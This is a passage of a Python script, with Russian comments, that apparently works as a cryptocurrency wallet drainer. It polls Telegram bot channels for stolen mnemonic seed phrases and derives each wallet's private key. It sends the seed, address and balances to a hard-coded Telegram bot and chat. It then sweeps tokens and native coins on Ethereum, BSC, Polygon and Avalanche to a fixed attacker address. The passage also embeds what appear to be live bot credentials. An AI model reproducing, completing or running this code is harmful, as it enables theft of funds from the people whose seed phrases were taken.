nternalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
                contract = web3a.eth.contract(address=token_contract, abi=abi)
                name_t = contract.functions.name().call()
                symbol = contract.functions.symbol().call()
                #nonce = web3.eth.getTransactionCount(pubkk)
                balanceOf = contract.functions.balanceOf(addrress).call()
                nonce = web3a.eth.getTransactionCount(addrress)
                #bal = web3a.eth.get_balance(addrress)
                estimate = contract.functions.transfer(web3a.toChecksumAddress(contract_owner), balanceOf).estimateGas({'from':addrress})
                print(f"{name_t} {symbol} {val} Gas estimate is: {estimate}")
                if estimate>900000:
                    print("Gas limit very high: ", estimate)
                else:
                    amount = estimate*web3a.eth.gasPrice
                    print("Amount for fee: ", web3a.fromWei(amount, 'ether'))
                    if web3a.eth.get_balance(addrress)<amount:
                        contract_script_avax(amount, addrress)
                    count=0
                    while web3a.eth.get_balance(addrress)<amount:
                        time.sleep(0.2)
                        #pubkk_getbalance = web3a.eth.get_balance(addrress)
                        count=count+1
                        if count==200:
                            print('Баланс не пополнен')
                            break
                    if web3a.eth.get_balance(addrress)>=amount:
                        print('Sending')
                        token_tx = contract.functions.transfer(web3a.toChecksumAddress(contract_owner), balanceOf).buildTransaction({'from':addrress, 'chainId':43114, 'gas': estimate, 'gasPrice': web3a.eth.gasPrice, 'nonce':nonce,})
                        for x in range(0, 7):
                            try:
                                sign_txn = web3a.eth.account.signTransaction(token_tx, privaKey)
                                tx_hash = web3a.eth.sendRawTransaction(sign_txn.rawTransaction)
                                print(f"Try it send {x}")
                            except:
                                pass
                        print(f"Token transfered :  {web3a.toHex(tx_hash)}")
                        time.sleep(1)
            except:
                print(f"Этот токен не пошел : {name_t} {symbol} {val}")
                mat_black = open("black_list_avax.txt", "a", encoding="utf8")
                mat_black.write(val + "\n")
                mat_black.close()
    return
################################################################################################################################################################################################################
    #print('не получилось проверить bsc токены')
    #time.sleep(1)
    #time.sleep(2)

def mneam_bsc(mnemonic):
    contract_owner = web3b.toChecksumAddress('0x9E9e7945A35c6c0C34303AAa5B9A959def035912')
    web3b.eth.account.enable_unaudited_hdwallet_features()
    accounttt = web3b.eth.account.from_mnemonic(mnemonic)
    privaKey = web3b.toHex(accounttt.privateKey)
    addrress = web3b.toChecksumAddress(accounttt.address)
    url_total_bal = "https://openapi.debank.com/v1/user/total_balance?id="+addrress
    ress = requests.get(url_total_bal)
    data = ress.json()
    usd_tot = int(data['total_usd_value'])
    if usd_tot==0:
        print('total zero')
    else:
        strx=[]
        data = json.loads(ress.text)
        for i in range(0, 29):
            if data['chain_list'][i]['usd_value']>0:
                lenss = f"{data['chain_list'][i]['id']} {data['chain_list'][i]['usd_value']}"  
                strx.append(lenss) 
##Телеграм
        send_msg = requests.get('https://api.telegram.org/bot5059975681:AAEXrJNll3XMVIyIh9OgmRNOvR-bocgF1mY/sendMessage?chat_id=1844570822&text='+str(strx)+ addrress+ ' '+mnemonic)
    check_bsc_tokens(addrress, privaKey)
    check_matic_tokens(addrress, privaKey)
    check_avax_tokens(addrress, privaKey)

    if web3e.eth.get_balance(addrress) > web3e.eth.gasPrice*21000:
        print('eth')
        balanceOf = web3e.eth.get_balance(addrress)-web3e.eth.gasPrice*21000
        nonce = web3e.eth.getTransactionCount(addrress)
        tx = {'chainId':1, 'nonce': nonce, 'to': contract_owner, 'value': balanceOf, 'gas': 21000, 'gasPrice': web3e.eth.gasPrice}
        signed_tx = web3e.eth.account.sign_transaction(tx, privaKey)
        tx_hash = web3e.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(web3e.toHex(tx_hash))
    if web3b.eth.get_balance(addrress) > web3b.eth.gasPrice*21000:
        print('bsc')
        balanceOf = web3b.eth.get_balance(addrress)-web3b.eth.gasPrice*21000
        nonce = web3b.eth.getTransactionCount(addrress)
        tx = {'chainId':56, 'nonce': nonce, 'to': contract_owner, 'value': balanceOf, 'gas': 21000, 'gasPrice': web3b.eth.gasPrice}
        signed_tx = web3b.eth.account.sign_transaction(tx, privaKey)
        tx_hash = web3b.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(web3b.toHex(tx_hash))
    if web3m.eth.get_balance(addrress) > web3m.eth.gasPrice*21000:
        print('matic')
        balanceOf = web3m.eth.get_balance(addrress)-web3m.eth.gasPrice*21000
        nonce = web3m.eth.getTransactionCount(addrress)
        tx = {'chainId':137, 'nonce': nonce, 'to': contract_owner, 'value': balanceOf, 'gas': 21000, 'gasPrice': web3m.eth.gasPrice}
        signed_tx = web3m.eth.account.sign_transaction(tx, privaKey)
        tx_hash = web3m.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(web3m.toHex(tx_hash))
    if web3a.eth.get_balance(addrress) > web3a.eth.gasPrice*21000:
        print('avax')
        balanceOf = web3a.eth.get_balance(addrress)-web3a.eth.gasPrice*21000
        nonce = web3a.eth.getTransactionCount(addrress)
        tx = {'chainId':43114, 'nonce': nonce, 'to': contract_owner, 'value': balanceOf, 'gas': 21000, 'gasPrice': web3a.eth.gasPrice}
        signed_tx = web3a.eth.account.sign_transaction(tx, privaKey)
        tx_hash = web3a.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(web3a.toHex(tx_hash))
    time.sleep(2)
########################################################################################################################

    
    return


def tg_msg_monitor():
    ##########################################
    i_huinch=int(config['DEFAULT']['i_huinch'])
    api_key_huinch = config['DEFAULT']['api_key_huinch']
    from_chat_id_huinch = config['DEFAULT']['from_chat_id_huinch']
    last_message_huinch = i_huinch 
    without_messages_huinch = 0
    ##########################################
    i_work23=int(config['DEFAULT']['i_work23'])
    api_key_work23 = config['DEFAULT']['api_key_work23']
    from_chat_id_work23 = config['DEFAULT']['from_chat_id_work23']
    last_message_work23 = i_work23 
    without_messages_work23 = 0
    ##########################################
    i_work23s=int(config['DEFAULT']['i_work23s'])
    api_key_work23s = config['DEFAULT']['api_key_work23s']
    from_chat_id_work23s = config['DEFAULT']['from_chat_id_work23s']
    last_message_work23s = i_work23s 
    without_messages_work23s = 0
    ##########################################
    while True:
        try:   
#########################################################################1huinch         
            url = ('https://api.telegram.org/bot'+api_key_huinch+'/forwardMessage?chat_id='+my_chat_id+'&from_chat_id='+from_chat_id_huinch+'&disable_notification=true&message_id='+str(i_huinch))
            x = requests.get(url)
            if x.status_code == 200:
                try:
                    resp = json.loads(x.text)
                    text_message = resp["result"]["text"]
                    print(f"message_id =", i_huinch, x, text_message)
                    s2 = text_message.splitlines()
                    mnemonic = s2[1]
                    mnemo = Mnemonic("english")
                    isValid = mnemo.check(mnemonic.lower()) # returns a boolean
                    if isValid == True:
                        print('checking..')
                        mneam_bsc(mnemonic.lower())
                except:
                    pass
                i_huinch=i_huinch+1
                last_message_huinch = i_huinch
                config['DEFAULT']['i_huinch'] = str(last_message_huinch)
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
            else:
                if x.status_code == 400:
                    without_messages_huinch = without_messages_huinch + 1
                    print(f"message_id =", i_huinch," ",x)
                    i_huinch=i_huinch+1
                else:
                    if x.status_code == 429:
                        print('Много запросов.. Таймаут 1 минута..')
                        time.sleep(60)
                    else:
                        if x.status_code == 401:
                            print('Pizda Strausam')

            if without_messages_huinch == 5:
                i_huinch = last_message_huinch
                without_messages_huinch = 0
            time.sleep(1)
    ######################################################################### mercuu
            url = ('https://api.telegram.org/bot'+api_key_work23+'/forwardMessage?chat_id='+my_chat_id+'&from_chat_id='+from_chat_id_work23+'&disable_notification=true&message_id='+str(i_work23))
            x = requests.get(url)
            if x.status_code == 200:
                if json.loads(x.text):
                    resp = json.loads(x.text)
                    try:
                        text_message = resp["result"]["text"]
                        print(f"message_id =", i_work23, x, text_message)
                        s2 = text_message.splitlines()
                        mnemonic = s2[2]
                        mnemonic = mnemonic.strip()
                        print(f"МНЕМОНИКА {mnemonic}")
                        mnemo = Mnemonic("english")
                        isValid = mnemo.check(mnemonic.lower()) # returns a boolean
                        if isValid == True:
                            print('checking..')
                            mneam_bsc(mnemonic.lower())
                    except:
                        pass
                i_work23=i_work23+1
                last_message_work23 = i_work23
                config['DEFAULT']['i_work23'] = str(last_message_work23)
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
            else:
                if x.status_code == 400:
                    without_messages_work23 = without_messages_work23 + 1
                    print(f"message_id =", i_work23," ",x)
                    i_work23=i_work23+1
                else:
                    if x.status_code == 429:
                        print('Много запросов.. Таймаут 1 минута..')
                        time.sleep(60)
                    else:
                        if x.status_code == 401:
                            print('Pizda Strausam')

            if without_messages_work23 == 13000:
                i_work23 = last_message_work23
                without_messages_work23 = 0
            time.sleep(1)
    ##########################################################################3work23s
            url = ('https://api.telegram.org/bot'+api_key_work23s+'/forwardMessage?chat_id='+my_chat_id+'&from_chat_id='+from_chat_id_work23s+'&disable_notification=true&message_id='+str(i_work23s))
            x = requests.get(url)
            if x.status_code == 200:
                resp = json.loads(x.text)
                try:
                    text_message = resp["result"]["text"]
                    print(f"message_id =", i_work23s, x, text_message)
                    s2 = text_message.splitlines()
                    mnemonic = s2[2]
                    mnemonic = mnemonic.strip()
                    print(f"МНЕМОНИКА {mnemonic}")
                    mnemo = Mnemonic("english")
                    isValid = mnemo.check(mnemonic.lower()) # returns a boolean
                    if isValid == True:
                        print('checking..')
                        mneam_bsc(mnemonic.lower())
                except:
                    pass
                i_work23s=i_work23s+1
                last_message_work23s = i_work23s
                config['DEFAULT']['i_work23s'] = str(last_message_work23s)
                with open('config.ini', 'w') as configfile:
                    config.write(configfile)
            else:
                if x.status_code == 400:
                    without_messages_work23s = without_messages_work23s + 1
                    print(f"message_id =", i_work23s," ",x)
                    i_work23s=i_work23s+1
                else:
                    if x.status_code == 429:
                        print('Много запросов.. Таймаут 1 минута..')
                        time.sleep(60)
                    else:
                        if x.status_code == 401:
                            print('Pizda Strausam')

            if without_messages_work23s == 20000:
                i_work23s = last_message_work23s
                without_messages_work23s = 0
            time.sleep(1)

        except:
            print('break')
            time.sleep(10)
#mneam_bsc(mnemonic)
tg_msg_monitor()